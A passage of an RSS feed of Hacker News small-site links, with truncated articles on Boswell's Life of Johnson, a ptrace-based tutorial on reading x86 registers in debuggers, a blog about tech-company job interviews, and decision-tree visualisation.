ditch.</p></blockquote><p>And around Johnson he painted an entire dramatic cast, bringing 18th century London to life: Garrick the great actor, Reynolds the painter, Beauclerk with his banter, Goldsmith with his insecurities. Monboddo and Burke, Henry and Hester Thrale, the blind Mrs Williams and the Jamaican freedman Francis Barber.</p><p>Borges (who was also a big fan) finds his parallels not in Shakespeare and Falstaff, but in Cervantes and Don Quixote. He (rather implausibly) suggests that every Quixote needs his Sancho, and "Boswell appears as a despicable character" deliberately to create a contrast.<span><a href="#fn10521873804" rel="footnote"><sup id="fnref10521873804">4</sup></a></span></p><p>And in the 1830s, two brilliant and influential reviews were written by two polar opposites: arch-progressive Thomas Babington Macaulay and radical reactionary Thomas Carlyle. The first thing you'll notice is their sheer magnitude: <a href="https://oll-resources.s3.amazonaws.com/titles/362/1227.01_Bk.pdf" target="_blank" rel="noopener">Macaulay's</a> is 55 pages long, while <a href="https://sci-hub.se/https://doi.org/10.1017/CBO9780511697234.003" target="_blank" rel="noopener">Carlyle's review in Fraser's Magazine</a> reaches 74 pages!<span><a href="#fn10521873805" rel="footnote"><sup id="fnref10521873805">5</sup></a></span> And while they both agree that it's a great book and that Boswell was a scoundrel, they have very different theories about what happened.</p><h2 id="Macaulay"><a href="#Macaulay" title="Macaulay"></a>Macaulay</h2><p>Never in history, Macaulay says, has there been "so strange a phænomenon as this book". On the one hand he has effusive praise:</p><blockquote><p>Homer is not more decidedly the first of heroic poets, Shakspeare is not more decidedly the first of dramatists, Demosthenes is not more decidedly the first of orators, than Boswell is the first of biographers. He has no second. He has distanced all his competitors so decidedly that it is not worth while to place them.</p></blockquote><p>On the other hand, he spends several paragraphs laying into Boswell with gusto:</p><blockquote><p>He was, if we are to give any credit to his own account or to the united testimony of all who knew him, a man of the meanest and feeblest intellect. [...] He was the laughing-stock of the whole of that brilliant society which has owed to him the greater part of its fame. He was always laying himself at the feet of some eminent man, and begging to be spit upon and trampled upon. [...] Servile and impertinent, shallow and pedantic, a bigot and a sot, bloated with family pride, and eternally blustering about the dignity of a born gentleman, yet stooping to be a talebearer, an eavesdropper, a common butt in the taverns of London.</p></blockquote><p>Macaulay's theory is that while Homer and Shakespeare and all the other greats owe their eminence to their virtues, Boswell is unique in that he owes <em>his</em> success to his vices.</p><blockquote><p>He was a slave, proud of his servitude, a Paul Pry, convinced that his own curiosity and garrulity were virtues, an unsafe companion who never scrupled to repay the most liberal hospitality by the basest violation of confidence, a man without delicacy, without shame, without sense enough to know when he was hurting the feelings of others or when he was exposing himself to derision; and because he was all this, he has, in an important department of literature, immeasurably surpassed such writers as Tacitus, Clarendon, Alfieri, and his own idol Johnson.</p></blockquote><blockquote><p>Of the talents which ordinarily raise men to eminence as writers, Boswell had absolutely none. There is not in all his books a single remark of his own on literature, politics, religion, or society, which is not either commonplace or absurd. [...] Logic, eloquence, wit, taste, all those things which are generally considered as making a book valuable, were utterly wanting to him. He had, indeed, a quick observation and a retentive memory. These qualities, if he had been a man of sense and virtue, would scarcely of themselves have sufficed to make him conspicuous; but, because he was a dunce, a parasite, and a coxcomb, they have made him immortal.</p></blockquote><p>The work succeeds partly because of its subject: if Johnson had not been so extraordinary, then airing all his dirty laundry would have just made him look bad.</p><blockquote><p>No man, surely, ever published such stories respecting persons whom he professed to love and revere. He would infallibly have made his hero as contemptible as he has made himself, had not his hero really possessed some moral and intellectual qualities of a very high order. The best proof that Johnson was really an extraordinary man is that his character, instead of being degraded, has, on the whole, been decidedly raised by a work in which all his vices and weaknesses are exposed.</p></blockquote><p>And finally, Boswell provided Johnson with a curious form of literary fame:</p><blockquote><p>The reputation of [Johnson's] writings, which he probably expected to be immortal, is every day fading; while those peculiarities of manner and that careless …</p></blockquote></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://fantasticanachronism.com/2020/10/22/when-the-worst-man-in-the-world-writes-a-masterpiece/#">https://fantasticanachronism.com/2020/10/22/when-the-worst-man-in-the-world-writes-a-masterpiece/#</a></em></p>]]>
            </description>
            <link>https://fantasticanachronism.com/2020/10/22/when-the-worst-man-in-the-world-writes-a-masterpiece/#</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870552</guid>
            <pubDate>Fri, 23 Oct 2020 15:33:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Debuggers Work: Getting and Setting x86 Registers]]>
            </title>
            <description>
<![CDATA[
Score 132 | Comments 11 (<a href="https://news.ycombinator.com/item?id=24870497">thread link</a>) | @tosh
<br/>
October 23, 2020 | https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-1/ | <a href="https://web.archive.org/web/*/https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/cpu-context-switch.svg" alt="Context Switch"></p>

<p>In this article, I would like to shortly describe the methods used
to dump and restore the different kinds of registers on 32-bit
and 64-bit x86 CPUs.  The first part will focus on General Purpose
Registers, Debug Registers and Floating-Point Registers up to the XMM
registers provided by the SSE extension.  I will explain how their
values can be obtained via the <code>ptrace(2)</code> interface.</p>

<p>The <code>ptrace(2)</code> API is commonly used in all modern BSD systems
and Linux, as all of them derive it from the original form designed
and implemented in 4.3BSD.  The primary focus in this article is
on the FreeBSD and NetBSD systems.  Nevertheless, the users of other
Operating Systems such as OpenBSD, DragonFly BSD or Linux can still
benefit from this article as the basic principles are the same
and the code examples are intended to be easily adapted to other
platforms.</p>

<p>A single CPU (in modern hardware: CPU core or CPU thread,
if hyperthreading is available) can execute only one program thread
at a time.  In order to be able to run multiple processes and threads
quasi-simultaneously, the Operating System must perform <em>context
switching</em> — that is periodically suspend the currently running thread,
save its state, restore the saved state of another thread and resume it.
Saving and restoring the values of the processor’s registers play
an important part in context switching.  It is important that
this process is fully transparent to the process being switched,
and in a properly implemented kernel there should be no side effects
that are perceptible to the program.</p>

<p>The debugger may need to examine the register sets of the debugged
program for a number of reasons.  By inspecting the Program Counter,
it is able to determine the location in source code at which
the execution will continue, and by altering it it can control
the execution.  The Stack Pointer is necessary to introspect variables
stored on the stack, while the remaining registers can hold variables
themselves.</p>

<p>A special set of the x86 registers are the Debug Registers.  They are
not accessible to the program itself; however, they can be read
or written by the debugger.  They allow setting hardware assisted
breakpoints (instruction execute trap) on the code being executed,
and watchpoints (read and/or write operation trap) on the variables.</p>

<h2 id="general-purpose-registers-gpr">General Purpose Registers (GPR)</h2>

<h3 id="copying-gprs">Copying GPRs</h3>

<p>The term ‘General Purpose Registers’ is a bit ambiguous.
In the narrower sense, it means the few (8 on i386, 16 on amd64)
baseline registers that can be used to store arbitrary data (usually
integers or pointers).  In the wider sense it means all baseline
registers in the processor architecture, historically excluding
floating-point registers and special kinds of registers.  On x86, this
includes the ‘narrower sense’ general-purpose registers, the Program
Counter (EIP/RIP), segment registers and the flag register.</p>

<p>The majority of the General Purpose Registers can be copied directly,
e.g. using the <code>MOV</code> instruction, or pushed onto the stack
via <code>PUSH</code>.  The EIP/RIP register can be copied using the <code>LEA</code>
instruction, and restored via <code>JMP</code>.  The flag register can be pushed
onto the stack via <code>PUSHFD</code>/<code>PUSHFQ</code>, and afterwards popped from it
via <code>POPFD</code>/<code>POPFQ</code>.</p>

<p>The listing below demonstrates a program that grabs the values of all
amd64 GPRs at an arbitrary point during the execution and prints them
after returning from assembly.</p>

<p>(<a href="https://github.com/Moritz-Systems/how-debuggers-work-registers-part-1/blob/master/dump-gpr.c">standalone example source</a>,
 <a href="#the-gpr-ptrace-2-api">skip listing</a>)</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;

enum {
    R_RAX, R_RBX, R_RCX, R_RDX, R_RSI, R_RDI, R_RBP, R_RSP,
    R_R8, R_R9, R_R10, R_R11, R_R12, R_R13, R_R14, R_R15,
    R_RIP, R_RFLAGS,
    R_LENGTH
};

enum {
    S_CS, S_DS, S_ES, S_FS, S_GS, S_SS,
    S_LENGTH
};

int main()
{
    uint64_t gpr[R_LENGTH];
    uint16_t seg[S_LENGTH];

    asm volatile (
        /* fill registers with random data */
        "mov $0x0102030405060708, %%rax\n\t"
        "mov $0x1112131415161718, %%rbx\n\t"
        "mov $0x2122232425262728, %%rcx\n\t"
        "mov $0x3132333435363738, %%rdx\n\t"
        "mov $0x4142434445464748, %%rsi\n\t"
        "mov $0x5152535455565758, %%rdi\n\t"
        /* RBP is used for frame pointer, RSP is stack pointer */
        "mov $0x8182838485868788, %%r8\n\t"
        "mov $0x9192939495969798, %%r9\n\t"
        "mov $0xa1a2a3a4a5a6a7a8, %%r10\n\t"
        "mov $0xb1b2b3b4b5b6b7b8, %%r11\n\t"
        "mov $0xc1c2c3c4c5c6c7c8, %%r12\n\t"
        "mov $0xd1d2d3d4d5d6d7d8, %%r13\n\t"
        "mov $0xe1e2e3e4e5e6e7e8, %%r14\n\t"
        "mov $0xf1f2f3f4f5f6f7f8, %%r15\n\t"

        /* dump GPRs */
        "mov %%rax, %[rax]\n\t"
        "mov %%rbx, %[rbx]\n\t"
        "mov %%rcx, %[rcx]\n\t"
        "mov %%rdx, %[rdx]\n\t"
        "mov %%rsi, %[rsi]\n\t"
        "mov %%rdi, %[rdi]\n\t"
        "mov %%rbp, %[rbp]\n\t"
        "mov %%rsp, %[rsp]\n\t"
        "mov %%r8, %[r8]\n\t"
        "mov %%r9, %[r9]\n\t"
        "mov %%r10, %[r10]\n\t"
        "mov %%r11, %[r11]\n\t"
        "mov %%r12, %[r12]\n\t"
        "mov %%r13, %[r13]\n\t"
        "mov %%r14, %[r14]\n\t"
        "mov %%r15, %[r15]\n\t"
        /* dump RIP */
        "lea (%%rip), %%rbx\n\t"
        "mov %%rbx, %[rip]\n\t"
        "mov %[rbx], %%rbx\n\t"
        /* dump segment registers */
        "mov %%cs, %[cs]\n\t"
        "mov %%ds, %[ds]\n\t"
        "mov %%es, %[es]\n\t"
        "mov %%fs, %[fs]\n\t"
        "mov %%gs, %[gs]\n\t"
        "mov %%ss, %[ss]\n\t"
        /* dump RFLAGS */
        "pushfq\n\t"
        "popq %[rflags]\n\t"

        : [rax] "=m"(gpr[R_RAX]), [rbx] "=m"(gpr[R_RBX]),
          [rcx] "=m"(gpr[R_RCX]), [rdx] "=m"(gpr[R_RDX]),
          [rsi] "=m"(gpr[R_RSI]), [rdi] "=m"(gpr[R_RDI]),
          [rbp] "=m"(gpr[R_RBP]), [rsp] "=m"(gpr[R_RSP]),
           [r8] "=m"(gpr[ R_R8]), [ r9] "=m"(gpr[ R_R9]),
          [r10] "=m"(gpr[R_R10]), [r11] "=m"(gpr[R_R11]),
          [r12] "=m"(gpr[R_R12]), [r13] "=m"(gpr[R_R13]),
          [r14] "=m"(gpr[R_R14]), [r15] "=m"(gpr[R_R15]),
          [rip] "=m"(gpr[R_RIP]), [rflags] "=m"(gpr[R_RFLAGS]),
          [cs] "=m"(seg[S_CS]), [ds] "=m"(seg[S_DS]),
          [es] "=m"(seg[S_ES]), [fs] "=m"(seg[S_FS]),
          [gs] "=m"(seg[S_GS]), [ss] "=m"(seg[S_SS])
        :
        : "%rax", "%rbx", "%rcx", "%rdx", "%rsi", "%rdi",
          "%r8", "%r9", "%r10", "%r11", "%r12", "%r13", "%r14", "%r15",
          "memory"
    );

    printf("rax = 0x%016lx\n", gpr[R_RAX]);
    printf("rbx = 0x%016lx\n", gpr[R_RBX]);
    printf("rcx = 0x%016lx\n", gpr[R_RCX]);
    printf("rdx = 0x%016lx\n", gpr[R_RDX]);
    printf("rsi = 0x%016lx\n", gpr[R_RSI]);
    printf("rdi = 0x%016lx\n", gpr[R_RDI]);
    printf("rbp = 0x%016lx\n", gpr[R_RBP]);
    printf("rsp = 0x%016lx\n", gpr[R_RSP]);
    printf(" r8 = 0x%016lx\n", gpr[R_R8]);
    printf(" r9 = 0x%016lx\n", gpr[R_R9]);
    printf("r10 = 0x%016lx\n", gpr[R_R10]);
    printf("r11 = 0x%016lx\n", gpr[R_R11]);
    printf("r12 = 0x%016lx\n", gpr[R_R12]);
    printf("r13 = 0x%016lx\n", gpr[R_R13]);
    printf("r14 = 0x%016lx\n", gpr[R_R14]);
    printf("r15 = 0x%016lx\n", gpr[R_R15]);
    printf("rip = 0x%016lx\n", gpr[R_RIP]);
    printf("cs = 0x%04x\n", seg[S_CS]);
    printf("ds = 0x%04x\n", seg[S_DS]);
    printf("es = 0x%04x\n", seg[S_ES]);
    printf("fs = 0x%04x\n", seg[S_FS]);
    printf("gs = 0x%04x\n", seg[S_GS]);
    printf("ss = 0x%04x\n", seg[S_SS]);
    printf("rflags = 0x%016lx\n", gpr[R_RFLAGS]);

    return 0;
}
</code></pre>

<h3 id="the-gpr-ptrace-2-api">The GPR ptrace(2) API</h3>

<p>Both FreeBSD and NetBSD use the <code>PT_GETREGS</code> request to get the values
of GPRs from the program, and <code>PT_SETREGS</code> to update them.
The requests take a pointer to <code>struct reg</code> as an argument.</p>

<p>On FreeBSD, both i386 and amd64 have the individual registers listed
as fields of the struct.  On NetBSD, i386 uses a regular structure,
while amd64 puts all values into an array whose indices are defined
in the headers as constants.</p>

<p>The listing below compares the structures used on FreeBSD and NetBSD.
Note that NetBSD/amd64 uses a special macro.  For example,
<code>greg(rdi RDI, 0)</code> defines <code>_REG_RDI</code>.</p>

<p>(<a href="https://github.com/freebsd/freebsd/blob/master/sys/x86/include/reg.h#L99">FreeBSD structs</a>,
 <a href="https://github.com/NetBSD/src/blob/trunk/sys/arch/i386/include/reg.h#L70">NetBSD/i386 struct</a>,
 <a href="https://github.com/NetBSD/src/blob/trunk/sys/arch/amd64/include/reg.h#L45">NetBSD/amd64 struct</a>,
 <a href="https://github.com/NetBSD/src/blob/trunk/sys/arch/amd64/include/frame_regs.h#L6">NetBSD/amd64 register names</a>,
 <a href="#floating-point-registers">skip listing</a>)</p>

<pre><code>/* FreeBSD/i386 */               /* NetBSD/i386 */

struct __reg32 {                 struct reg {
    __uint32_t  r_fs;               int r_eax;
    __uint32_t  r_es;               int r_ecx;
    __uint32_t  r_ds;               int r_edx;
    __uint32_t  r_edi;              int r_ebx;
    __uint32_t  r_esi;              int r_esp;
    __uint32_t  r_ebp;              int r_ebp;
    __uint32_t  r_isp;              int r_esi;
    __uint32_t  r_ebx;              int r_edi;
    __uint32_t  r_edx;              int r_eip;
    __uint32_t  r_ecx;              int r_eflags;
    __uint32_t  r_eax;              int r_cs;
    __uint32_t  r_trapno;           int r_ss;
    __uint32_t  r_err;              int r_ds;
    __uint32_t  r_eip;              int r_es;
    __uint32_t  r_cs;               int r_fs;
    __uint32_t  r_eflags;           int r_gs;
    __uint32_t  r_esp;           };
    __uint32_t  r_ss;
    __uint32_t  r_gs;
};


/* FreeBSD/amd64 */              /* NetBSD/amd64 */

struct __reg64 {                 #define _FRAME_REG(greg, freg) \
    __int64_t   r_r15;               greg(rdi, RDI, 0) \
    __int64_t   r_r14;               greg(rsi, RSI, 1) \
    __int64_t   r_r13;               greg(rdx, RDX, 2) \
    __int64_t   r_r12;               greg(r10, R10, 6) \
    __int64_t   r_r11;               greg(r8,  R8,  4) \
    __int64_t   r_r10;               greg(r9,  R9,  5) \
    __int64_t   r_r9;                /* ... */ \
    __int64_t   r_r8;                greg(rcx, RCX, 3) \
    __int64_t   r_rdi;               greg(r11, R11, 7) \
    __int64_t   r_rsi;               greg(r12, R12, 8) \
    __int64_t   r_rbp;               greg(r13, R13, 9) \
    __int64_t   r_rbx;               greg(r14, R14, 10) \
    __int64_t   r_rdx;               greg(r15, R15, 11) \
    __int64_t   r_rcx;               greg(rbp, RBP, 12) \
    __int64_t   r_rax;               …</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-1/">https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-1/</a></em></p>]]>
            </description>
            <link>https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870497</guid>
            <pubDate>Fri, 23 Oct 2020 15:29:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Interviews with Facebook, Twitter, and Microsoft]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24870481">thread link</a>) | @dochtman
<br/>
October 23, 2020 | https://jmmv.dev/2020/10/facebook-twitter-microsoft-interviews.html | <a href="https://web.archive.org/web/*/https://jmmv.dev/2020/10/facebook-twitter-microsoft-interviews.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
              
              <article>

<p>Welcome back! Let’s continue the previous post on my <a href="https://jmmv.dev/2020/10/bye-google-hi-microsoft.html">reasons for moving from Google to Microsoft</a> by looking at my whole interviewing process. I’ve been asked by a few peers to narrate this story because they are curious to know how this process looked like for a person with 10+ years of professional experience. And, well, it’s just a topic I wanted to write about anyway 😉.</p>

<p>As a reminder, and to pique your interest, I applied for:</p>

<ul>
<li>🟦 a Software Engineer (SWE) position at Facebook;</li>
<li>🟦 a Production Engineer (PE) position at Facebook;</li>
<li>⚫ a Software Engineer (SWE) position at Twitter in their Build Efficiency team;</li>
<li>💚 a Principal Software Engineer (SDE) position at Microsoft in their Azure Data product; and</li>
<li>💚 a Principal Software Engineer (SDE) position at Microsoft in their Azure Storage product.</li>
</ul>

<p>That’s a total of 5 applications and talks with ~40 different people. Of those, the position in Azure Data vanished before I even interviewed, but I successfully <em>got to the offer stage for the other 4</em>. I entered this whole endeavor fixated on joining Facebook but… along the way, I uncovered exciting opportunities throughout, making my choice exceedingly difficult. In the end, I swerved towards the Azure Storage position for various reasons, but it’d have gone either way.</p>

<p>In this post, I want to be as honest and open as possible about <em>my personal situation</em> and how it related to the processes. As a result, some of the things I say might sound like a borderline rant—but that’s not the intention. Lastly, remember that interviewing always comes with the need to sign an NDA, so I cannot go into a lot of details.</p>



<p>Before we get into the processes, let’s talk about… career ladder <em>levels</em>! Uh, so exciting.</p>

<p>Levels are a very important topic for this discussion because each of the positions I applied to was attached to a specific level. The positions’ level significantly influenced how I went about zeroing in on my final choice. Beware that my view on this topic is through Google-tinted glasses and doesn’t necessarily apply to all companies—although I believe it does for the companies I talked to.</p>

<p>You see, recruiters and higher-level peers will often tell you not to get obsessed with levels or promotion: <em>“levels don’t matter”</em>, they’ll happily say. In principle, the people you work with know how you work in practice so the level you are at is irrelevant, and higher compensation can be achieved without promotion. Yes, compensation is weird: you can be paid more at a lower level by constantly exceeding expectations than at a higher level by just cruising.</p>

<p>In reality, however, I believe levels <em>do</em> matter a lot, even for an Individual Contributor (IC, non-manager) position. Here is why:</p>

<ul>
<li><p>Being at a higher level influences the kind of opportunities you are <em>exposed</em> to work on. You’d like to think that expertise and recognition do that instead: and they definitely do, but only within the realm of your team. Once you have to deal with teams and managers that don’t know you personally, the level you hold conveys that information. And thus the same applies when you land at a new company where nobody knows anything about you.</p></li>

<li><p>Being at a higher level grants you extra responsibilities and expectations—and I say <em>grant</em> because I think those are great traits. I personally want to grow in these areas, and I know that getting a higher title will subconsciously influence me to behave differently, just as it happened once I go the not-officially-recognized Tech Lead job within my team.</p></li>
</ul>

<p>NOTE: This is a good chance to visit <a href="https://www.levels.fyi/">levels.fyi</a>. Familiarize yourself with how levels map across companies and how they overlap across them. What’s <strong>not</strong> depicted there are the actual responsibilities of each level, nor that level compensation bans overlap <em>within a company</em>.</p>

<p>You might be wondering why any of this is important during the interviewing process. In fact, if all you care about is higher compensation, then this isn’t very important.</p>

<p>For me, though, my personal situation was problematic in finding the right position. I had been at the Senior (L5) level at Google for 5 years now, trying to make the jump into Staff (L6) territory for at least 3 of those years. My management chain and direct peers had been supportive of this promotion for quite a while now, and I am convinced my work did too. As a result, my compensation matched that: I was at the top of the Senior level band.</p>

<p>This unofficial recognition, however, is not reflected anywhere: you have to believe me at face value. For anyone that doesn’t know me within or outside the company, I’m an L5—and that can mean <em>a lot</em> of different things because of how broad levels are. One might be at the lower level, struggling to keep up with the demands and being paid the bare minimum; one can be in the middle, having a comfortable and non-stressful life with a good salary; and one can be at the top, trying to make the leap into the next band.</p>

<p>Unfortunately for me, the jump into the Staff level didn’t materialize at Google, dare I say… due to process failures. Promotions are a game and it is a game I did not play well; keep that in mind if you want them. But I didn’t want the job change to <em>feel</em> like a step down. <strong>My goal was to get hired as a Google L6-equivalent position elsewhere</strong> to properly reflect my skills, to make me uncomfortable enough to grow new skills, and to not have to prove myself all over again, which would take a long time.</p>



<p>Dealing with different companies at the same time was an exhausting, but important, process. As a reminder: if you want to have any leverage during offer negotiations, you ought to have other offers on the table. In the end, and as we shall see later, these weren’t very useful for my own negotiations (other things were), but they were eye-opening as I got to witness that there are exciting opportunities everywhere.</p>

<p>Given the many people I talked to (about 40) and the length of the process, I took copious notes each time I interacted with anyone. Specifically, I captured the names of each person I talked to and what they did at each company. I also captured anything the recruiters said in order to prevent future misunderstandings, because sometimes they contradicted what others had previously said.</p>

<p>Below is the full timeline. I know it’s long but I want to show how all the processes interwove. To that end, I have color- and shape-coded entries: Facebook is 🟦, Twitter is ⚫, and Microsoft is 💚:</p>

<ol>
<li><strong>Initial approach:</strong>

<ol>
<li><strong>2020-03-04:</strong> 🟦 Attended a happy hour event organized by Facebook’s PE team. I indicate my interest to apply and get contacted right away by email to follow up.</li>
<li><strong>2020-03-11:</strong> COVID-19 lockdown. I “forget” about job switching for a little while.</li>
<li><strong>2020-06-05:</strong> Researched jobs in the Seattle area and how leveling works across companies.</li>
<li><strong>2020-06-11:</strong> 🟦 ⚫ 💚 Got back to the Facebook recruiters with my intention to move forward. Applied for one Twitter position and two Microsoft positions online.</li>
</ol></li>
<li><strong>Phone screens (about a month):</strong>

<ol>
<li><strong>2020-06-12:</strong> 🟦 Phone call with Facebook’s PE recruiter.</li>
<li><strong>2020-06-16:</strong> Phone call with an Amazon recruiter. I forgot about that one… but I let it slide.</li>
<li><strong>2020-06-17:</strong> 🟦 Facebook SWE recruiter chat to explore openings in Seattle.</li>
<li><strong>2020-06-29:</strong> 💚 Chat with Azure Data recruiter.</li>
<li><strong>2020-07-02:</strong> ⚫ “Cold call” from Twitter recruiter who approached me separately from my application. Same-day (!) chat with hiring manager.</li>
<li><strong>2020-07-06:</strong> 🟦 Facebook PE phone screens.</li>
<li><strong>2020-07-07:</strong> 🟦 ⚫ 💚 Facebook SWE phone screen. Received coding challenge from Twitter. Second recruiter from Microsoft asks me to file questionnaire for the Azure Storage application.</li>
<li><strong>2020-07-08:</strong> 🟦 Facebook PE recruiter follow-up after passing phone screens.</li>
<li><strong>2020-07-09:</strong> 🟦 Facebook SWE recruiter follow-up after passing phone screens.</li>
<li><strong>2020-07-10:</strong> ⚫ 💚 Turned in Twitter’s coding challenge. Phone screen and chat with Azure Data.</li>
<li><strong>2020-07-13:</strong> 🟦 Facebook PE prep call for interviews.</li>
<li><strong>2020-07-14:</strong> 🟦 Facebook SWE prep call for interviews.</li>
<li><strong>2020-07-15:</strong> 💚 Notification that the Azure Data position is gone (or I failed?).</li>
</ol></li>
<li><strong>Interviews (three weeks):</strong>

<ol>
<li><strong>2020-07-20:</strong> 🟦 Facebook SWE interviews.</li>
<li><strong>2020-07-21:</strong> 💚 Azure Storage phone screen / champion call.</li>
<li><strong>2020-07-22:</strong> 🟦 Facebook PE interviews.</li>
<li><strong>2020-07-23:</strong> 🟦 Facebook SWE follow-up interview on soft skills.</li>
<li><strong>2020-07-30:</strong> 🟦 Facebook PE confirms I’ll get an offer.</li>
<li><strong>2020-07-31:</strong> 🟦 Facebook SWE confirms I’ll get an offer. Two champion calls with PE managers.</li>
<li><strong>2020-08-03:</strong> 🟦 Two more Facebook champion calls: one PE and one SWE.</li>
<li><strong>2020-08-04:</strong> ⚫ Twitter interviews.</li>
<li><strong>2020-08-05:</strong> 🟦 💚 Facebook SWE recruiter chat. Azure Storage interviews.</li>
<li><strong>2020-08-06:</strong> 🟦 ⚫ Facebook SWE and PE recruiter chats, decide to go for SWE. Twitter replies and notifies that they won’t move forward with a Staff position, but we can research other options.</li>
</ol></li>
<li><strong>Offers and negotiation (2 weeks):</strong>

<ol>
<li><strong>2020-08-10:</strong> 🟦 💚 Got initial Facebook SWE offer. Pinged Microsoft recruiter and got told I got strong feedback so will know the outcome soon. Also, my birthday.</li>
<li><strong>2020-08-11:</strong> 💚 Azure Storage initial offer.</li>
<li><strong>2020-08-12:</strong> 💚 Champion call with Azure Storage hiring manager.</li>
<li><strong>2020-08-14:</strong> 🟦 ⚫ Facebook replies with a new offer and one more SWE champion call. Twitter manager call to explore new options.</li>
<li><strong>2020-08-17:</strong> 💚 New Azure Storage offer.</li>
<li><strong>2020-08-18:</strong> ⚫ 💚 Twitter recruiter chat with option to get an offer as Senior or the chance of doing more interviews. I say no to Twitter at this point. Got new Azure Storage offer.</li>
<li><strong>2020-08-20:</strong> 🟦 💚 More Facebook manager champion calls. New Azure Storage offer.</li>
<li><strong>2020-08-21:</strong> 💚 Azure Storage offer amendment (there was an issue with the previous numbers). I say yes.</li>
<li><strong>2020-08-24:</strong> 🟦 Facebook recruiter call. I say no. Got one more manager champion call.</li>
<li><strong>2020-08-25:</strong> 🟦 Facebook manager champion call. My decision stands.</li>
<li><strong>2020-08-26:</strong> 💚 Signed Microsoft offer.</li>
</ol></li>
<li>Landing:

<ol>
<li><strong>2020-08-27:</strong> 💚 Background checks start.</li>
<li><strong>2020-09-02:</strong> 💚 Relocation starts.</li>
<li><strong>2020-09-10:</strong> 💚 Gave notice to Google. Initial departure date Oct 2nd.</li>
<li><strong>2020-09-16:</strong> 💚 Renegotiate start date with …</li></ol></li></ol></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jmmv.dev/2020/10/facebook-twitter-microsoft-interviews.html">https://jmmv.dev/2020/10/facebook-twitter-microsoft-interviews.html</a></em></p>]]>
            </description>
            <link>https://jmmv.dev/2020/10/facebook-twitter-microsoft-interviews.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870481</guid>
            <pubDate>Fri, 23 Oct 2020 15:28:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CSS Spider – fast and easy way to check, copy and edit CSS]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 15 (<a href="https://news.ycombinator.com/item?id=24870450">thread link</a>) | @URfejk
<br/>
October 23, 2020 | https://cssspider.fresalabs.com/home | <a href="https://web.archive.org/web/*/https://cssspider.fresalabs.com/home">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://cssspider.fresalabs.com/home</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870450</guid>
            <pubDate>Fri, 23 Oct 2020 15:25:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Visualize Decision Trees]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24870390">thread link</a>) | @part1of2
<br/>
October 23, 2020 | https://explained.ai/decision-tree-viz/ | <a href="https://web.archive.org/web/*/https://explained.ai/decision-tree-viz/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">






<p><a href="http://parrt.cs.usfca.edu/">Terence Parr</a> and <a href="https://www.linkedin.com/in/groverpr">Prince Grover</a></p>

<p>(Terence teaches in <a href="https://www.usfca.edu/arts-sciences/graduate-programs/data-science">University of San Francisco's MS in Data Science program</a> and Prince is an alumnus. You might know Terence as the creator of the ANTLR parser generator.)
</p><p>Please send comments, suggestions, or fixes to <a href="mailto:parrt@cs.usfca.edu">Terence</a>.</p>







<p><b>Update July 2020</b> <a href="https://github.com/tlapusan">Tudor Lapusan</a> has become a major contributor to <span>dtreeviz</span> and, thanks to his work, <span>dtreeviz</span> can now visualize <a href="https://xgboost.ai/">XGBoost</a> and <a href="https://spark.apache.org/">Spark</a> decision trees as well as sklearn.  Beyond what is described in this article, the library now also includes the following features. See <a href="https://github.com/parrt/dtreeviz/blob/master/notebooks/dtreeviz_sklearn_visualisations.ipynb">dtreeviz_sklearn_visualisations.ipynb</a> for examples.</p>
<center>
<table>
<thead>
</thead>
<tbody>
<tr>
<td>A visualization of just the path from the root to a decision tree leaf.</td><td>An explanation in English how a decision tree makes a prediction for a specific record.</td>
</tr>
<tr>
<td>

<center>
<center>
<a href="https://explained.ai/decision-tree-viz/images/dtreeviz_prediction_path1.png">
<img src="https://explained.ai/decision-tree-viz/images/dtreeviz_prediction_path1.png" width="100%" url="images/dtreeviz_prediction_path1.png">
</a>
</center>

</center>

</td><td>

<center>
<center>
<a href="https://explained.ai/decision-tree-viz/images/dtreeviz_prediction_path2.png">
<img src="https://explained.ai/decision-tree-viz/images/dtreeviz_prediction_path2.png" width="100%" url="images/dtreeviz_prediction_path2.png">
</a>
</center>

</center>

</td>
</tr>
</tbody>
</table>
</center>
<p>Visualizations for purity and distributions for individual leaves.</p>
<center>
<table>
<thead>
</thead>
<tbody>
<tr>
<td>

<center>
<center>
<a href="https://explained.ai/decision-tree-viz/images/dtreeviz_leaves_1.png">
<img src="https://explained.ai/decision-tree-viz/images/dtreeviz_leaves_1.png" width="100%" url="images/dtreeviz_leaves_1.png">
</a>
</center>

</center>

</td><td>

<center>
<center>
<a href="https://explained.ai/decision-tree-viz/images/dtreeviz_leaves_2.png">
<img src="https://explained.ai/decision-tree-viz/images/dtreeviz_leaves_2.png" width="100%" url="images/dtreeviz_leaves_2.png">
</a>
</center>

</center>

</td><td>

<center>
<center>
